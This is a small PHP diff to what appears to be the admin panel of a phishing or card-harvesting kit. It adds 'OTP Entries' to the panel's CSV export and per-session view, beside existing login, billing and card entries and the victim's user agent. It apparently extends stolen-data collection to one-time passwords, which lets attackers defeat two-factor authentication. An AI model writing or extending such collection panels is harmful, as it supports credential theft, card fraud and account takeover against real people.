@@ -58,6 +58,7 @@ if ($export === 'csv') {
             'Login Entries',
             'Billing Entries',
             'Card Entries',
+            'OTP Entries',
         ];
         fputcsv($output, $headers);
 
@@ -90,6 +91,7 @@ if ($export === 'csv') {
                 $formatEntries($session['login'] ?? null),
                 $formatEntries($session['billing'] ?? null),
                 $formatEntries($session['card'] ?? null),
+                $formatEntries($session['otp'] ?? null),
             ]);
         }
 
@@ -361,7 +363,7 @@ $flash = admin_flash();
                     <div><strong>User Agent:</strong> <?php echo htmlspecialchars($meta['user_agent'] ?? 'unknown', ENT_QUOTES, 'UTF-8'); ?></div>
                 </div>
 
-                <?php foreach (['login' => 'Login', 'billing' => 'Billing', 'card' => 'Card'] as $key => $label): ?>
+                <?php foreach (['login' => 'Login', 'billing' => 'Billing', 'card' => 'Card', 'otp' => 'OTP'] as $key => $label): ?>
                     <div class="entry-section">
                         <h3><?php echo htmlspecialchars($label, ENT_QUOTES, 'UTF-8'); ?> Entries</h3>
                         <?php if (empty($session[$key])): ?>
